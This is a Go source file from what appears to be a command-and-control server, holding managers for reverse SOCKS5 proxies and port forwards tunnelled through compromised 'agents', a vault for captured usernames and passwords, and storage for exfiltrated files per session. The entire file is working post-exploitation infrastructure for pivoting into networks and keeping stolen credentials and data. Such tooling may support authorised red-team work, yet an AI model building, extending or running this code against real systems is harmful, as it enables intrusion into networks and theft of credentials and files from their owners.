package c2

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"bty/src/go/internal/socks"
)

// SOCKS5Manager manages reverse SOCKS5 proxies per agent.
type SOCKS5Manager struct {
	proxies map[string]*socks.Server
	mu      sync.RWMutex
}

// NewSOCKS5Manager creates a new SOCKS5 manager.
func NewSOCKS5Manager() *SOCKS5Manager {
	return &SOCKS5Manager{
		proxies: make(map[string]*socks.Server),
	}
}

// StartProxy starts a SOCKS5 proxy for the given session.
// The proxy listens on localhost:port and tunnels through the agent.
func (m *SOCKS5Manager) StartProxy(sessionID string, port int, dialFn func(target string) (net.Conn, error)) (string, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Check if already running
	if _, exists := m.proxies[sessionID]; exists {
		return "", fmt.Errorf("proxy already running for session %s", sessionID)
	}

	addr := fmt.Sprintf("127.0.0.1:%d", port)
	proxy := socks.New(addr, dialFn)

	if err := proxy.Start(); err != nil {
		return "", fmt.Errorf("start proxy: %w", err)
	}

	m.proxies[sessionID] = proxy
	log.Printf("[SOCKS5] Proxy started for %s on %s", sessionID, addr)
	return addr, nil
}

// StopProxy stops a SOCKS5 proxy for a session.
func (m *SOCKS5Manager) StopProxy(sessionID string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if proxy, ok := m.proxies[sessionID]; ok {
		proxy.Stop()
		delete(m.proxies, sessionID)
		log.Printf("[SOCKS5] Proxy stopped for %s", sessionID)
	}
}

// ListProxies returns all active proxy mappings.
func (m *SOCKS5Manager) ListProxies() map[string]string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make(map[string]string)
	for id, proxy := range m.proxies {
		result[id] = proxy.Addr()
	}
	return result
}

// --- Credential Vault ---

// CredentialVault stores captured credentials.
type CredentialVault struct {
	creds []Credential
	mu    sync.RWMutex
}

// Credential represents a captured credential.
type Credential struct {
	ID        string    `json:"id"`
	Username  string    `json:"username"`
	Password  string    `json:"password"`
	Domain    string    `json:"domain"`
	Host      string    `json:"host"`
	Service   string    `json:"service"`
	Source    string    `json:"source"`
	Captured  time.Time `json:"captured"`
	Notes     string    `json:"notes"`
}

// NewCredentialVault creates a new credential vault.
func NewCredentialVault() *CredentialVault {
	return &CredentialVault{
		creds: make([]Credential, 0),
	}
}

// Add adds a credential to the vault.
func (v *CredentialVault) Add(c Credential) string {
	v.mu.Lock()
	defer v.mu.Unlock()

	c.ID = fmt.Sprintf("cred-%x", time.Now().UnixNano())
	c.Captured = time.Now()
	v.creds = append(v.creds, c)
	return c.ID
}

// Search searches credentials by keyword.
func (v *CredentialVault) Search(query string) []Credential {
	v.mu.RLock()
	defer v.mu.RUnlock()

	var results []Credential
	query = strings.ToLower(query)

	for _, c := range v.creds {
		if query == "" ||
			strings.Contains(strings.ToLower(c.Username), query) ||
			strings.Contains(strings.ToLower(c.Domain), query) ||
			strings.Contains(strings.ToLower(c.Host), query) ||
			strings.Contains(strings.ToLower(c.Service), query) ||
			strings.Contains(strings.ToLower(c.Source), query) {
			results = append(results, c)
		}
	}

	return results
}

// List returns all credentials.
func (v *CredentialVault) List() []Credential {
	v.mu.RLock()
	defer v.mu.RUnlock()

	result := make([]Credential, len(v.creds))
	copy(result, v.creds)
	return result
}

// Count returns the number of stored credentials.
func (v *CredentialVault) Count() int {
	v.mu.RLock()
	defer v.mu.RUnlock()
	return len(v.creds)
}

// --- File Manager ---

// FileManager handles exfiltrated file storage.
type FileManager struct {
	baseDir string
	files   []FileRecord
	mu      sync.RWMutex
}

// FileRecord represents an exfiltrated file entry.
type FileRecord struct {
	ID        string    `json:"id"`
	Filename  string    `json:"filename"`
	SessionID string    `json:"session_id"`
	Module    string    `json:"module"`
	Size      int64     `json:"size"`
	Path      string    `json:"path"`
	Created   time.Time `json:"created"`
}

// NewFileManager creates a new file manager.
func NewFileManager(baseDir string) *FileManager {
	os.MkdirAll(baseDir, 0700)
	return &FileManager{
		baseDir: baseDir,
		files:   make([]FileRecord, 0),
	}
}

// Store saves an exfiltrated file to disk.
func (f *FileManager) Store(sessionID, filename, module string, data []byte) (*FileRecord, error) {
	f.mu.Lock()
	defer f.mu.Unlock()

	id := fmt.Sprintf("file-%x", time.Now().UnixNano())
	safeName := filepath.Base(filename)
	storePath := filepath.Join(f.baseDir, sessionID, safeName)

	os.MkdirAll(filepath.Dir(storePath), 0700)

	if err := os.WriteFile(storePath, data, 0600); err != nil {
		return nil, fmt.Errorf("write file: %w", err)
	}

	rec := FileRecord{
		ID:        id,
		Filename:  safeName,
		SessionID: sessionID,
		Module:    module,
		Size:      int64(len(data)),
		Path:      storePath,
		Created:   time.Now(),
	}

	f.files = append(f.files, rec)
	return &rec, nil
}

// Get returns a file record by ID.
func (f *FileManager) Get(id string) (*FileRecord, error) {
	f.mu.RLock()
	defer f.mu.RUnlock()

	for _, rec := range f.files {
		if rec.ID == id {
			return &rec, nil
		}
	}
	return nil, fmt.Errorf("file not found: %s", id)
}

// Read reads the contents of a stored file.
func (f *FileManager) Read(id string) ([]byte, *FileRecord, error) {
	f.mu.RLock()
	defer f.mu.RUnlock()

	for _, rec := range f.files {
		if rec.ID == id {
			data, err := os.ReadFile(rec.Path)
			if err != nil {
				return nil, nil, fmt.Errorf("read file: %w", err)
			}
			return data, &rec, nil
		}
	}
	return nil, nil, fmt.Errorf("file not found: %s", id)
}

// List returns all file records.
func (f *FileManager) List() []FileRecord {
	f.mu.RLock()
	defer f.mu.RUnlock()

	result := make([]FileRecord, len(f.files))
	copy(result, f.files)
	return result
}

// --- Port Forward Manager ---

// PortFwdManager handles port forwarding (local → C2 → agent → remote).
type PortFwdManager struct {
	forwards map[string]*PortForward
	mu       sync.RWMutex
}

// PortForward represents a single port forward rule.
type PortForward struct {
	ID        string
	LocalPort int
	RemoteHost string
	RemotePort int
	SessionID string
	listener  net.Listener
	running   bool
}

// NewPortFwdManager creates a new port forwarding manager.
func NewPortFwdManager() *PortFwdManager {
	return &PortFwdManager{
		forwards: make(map[string]*PortForward),
	}
}

// Start starts a local port forward that tunnels through an agent.
func (m *PortFwdManager) Start(sessionID string, localPort int, remoteHost string, remotePort int, dialFn func(target string) (net.Conn, error)) (*PortForward, error) {
	m.mu.Lock()
	defer m.mu.Unlock()

	id := fmt.Sprintf("fwd-%x", time.Now().UnixNano())

	fwd := &PortForward{
		ID:         id,
		LocalPort:  localPort,
		RemoteHost: remoteHost,
		RemotePort: remotePort,
		SessionID:  sessionID,
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return nil, fmt.Errorf("listen: %w", err)
	}

	fwd.listener = listener
	fwd.running = true
	m.forwards[id] = fwd

	target := fmt.Sprintf("%s:%d", remoteHost, remotePort)

	go func() {
		for fwd.running {
			conn, err := listener.Accept()
			if err != nil {
				if !fwd.running {
					return
				}
				continue
			}

			go func(client net.Conn) {
				defer client.Close()

				targetConn, err := dialFn(target)
				if err != nil {
					log.Printf("[PORTFWD] Failed to dial target %s: %v", target, err)
					return
				}
				defer targetConn.Close()

				var wg sync.WaitGroup
				wg.Add(2)
				go func() { defer wg.Done(); io.Copy(targetConn, client) }()
				go func() { defer wg.Done(); io.Copy(client, targetConn) }()
				wg.Wait()
			}(conn)
		}
	}()

	log.Printf("[PORTFWD] %s → %s (via %s)", fmt.Sprintf("127.0.0.1:%d", localPort), target, sessionID)
	return fwd, nil
}

// Stop stops a port forward.
func (m *PortFwdManager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	fwd, ok := m.forwards[id]
	if !ok {
		return fmt.Errorf("forward not found: %s", id)
	}

	fwd.running = false
	fwd.listener.Close()
	delete(m.forwards, id)
	return nil
}

// List returns all active port forwards.
func (m *PortFwdManager) List() []PortForward {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]PortForward, 0, len(m.forwards))
	for _, fwd := range m.forwards {
		result = append(result, *fwd)
	}
	return result
}

// --- Ensure json imported ---
var _ = json.Marshal
